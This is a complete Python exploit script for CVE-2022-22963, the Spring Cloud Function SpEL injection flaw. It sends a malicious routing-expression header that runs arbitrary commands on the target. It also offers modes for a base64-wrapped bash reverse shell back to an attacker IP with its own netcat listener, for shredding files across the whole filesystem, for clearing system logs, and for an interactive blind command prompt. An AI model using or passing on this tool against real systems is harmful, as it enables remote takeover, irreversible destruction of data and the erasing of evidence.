#!/usr/bin/python3
import requests
import argparse
import time
from threading import Thread
import os
import base64
from termcolor import colored

def _print_message(message, type):
    if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
    elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
    elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
    elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
    elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)

def _nc_listener():
    os.system("nc -lnvp 4444")

def exploit(url,cmd):
    vulnURL = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    response = requests.post(url = vulnURL, data = body, headers = headers, verify=False, timeout=5)
    return response

def check_vuln(resp):
    error_text = '"error":"Internal Server Error"'
    if resp.status_code == 500 and error_text in resp.text:
        _print_message(f'[+] {target_url} is vulnerable\n', "SUCCESS")
        return True
    else:
        _print_message(f'[-] {target_url} is not vulnerable\n', "ERROR")
        return False

def _prepare_command(command):
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    final_command = 'bash -c {echo,' + encoded_command + '}|{base64,-d}|{bash,-i}'
    return final_command

def data_destruction(url):
    data_destruction_command = "find / -type f ! -path '/tmp/*' ! -path '/etc/*' ! -path '/lib/*' -exec shred -u -n 3 {} \;"
    final_command = _prepare_command(data_destruction_command)
    exploit(url,final_command)

def log_removal(url):
    log_removal_command = "cat /dev/null > /var/log/messages"
    final_command = _prepare_command(log_removal_command)
    exploit(url,final_command)

def reverse_shell(url, ip, port):
    listener_thread = Thread(target=_nc_listener)
    listener_thread.start()
    time.sleep(2)
    reverse_shell_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    #final_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
    final_command = _prepare_command(reverse_shell_command)
    exploit(url,final_command)

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', type=str,
                        help='IP address of victim spring application')
    parser.add_argument('-p', '--port', type=str,
                        help='Port of victim spring application')
    parser.add_argument('-I', '--atk-ip', type=str,
                        help='IP address of attacker', default="10.0.0.180")
    parser.add_argument('-P', '--atk-port', type=str, default="4444",
                        help='Port of attacker (Default:4444')
    parser.add_argument('--reverse-shell', action='store_true', help='Enable reverse shell')
    parser.add_argument('--data-destruction', action='store_true', help='Enable reverse shell')
    parser.add_argument('--log-removal', action='store_true', help='Enable reverse shell')
    args = parser.parse_args()

    if args.ip is None or args.port is None:
        parser.print_help()
        exit(0)

    target_url = f"http://{args.ip}:{args.port}"

    _print_message(f"[+] Target {target_url}\n", "INFO")
    _print_message(f"[+] Checking if {target_url} is vulnerable to CVE-2022-22963...\n", "INFO")
    response = exploit(target_url,"touch /tmp/pwned")
    v = check_vuln(response)
    if v:
        if args.reverse_shell:
            reverse_shell(target_url, args.atk_ip, args.atk_port)
        elif args.data_destruction:
           data_destruction(target_url)
        elif args.log_removal:
            log_removal(target_url)
        else:
            while True:
                _print_message("Remote code execution", "INFO")
                _print_message("No shell response will be shown, because the vulnerability does not allow it", "WARNING")
                input_command = input(colored('>>', 'green'))
                if input_command in {'q','exit','quit','exit()','quit()'}:
                    exit()
                exploit(target_url,input_command)
    else:
        exit(0)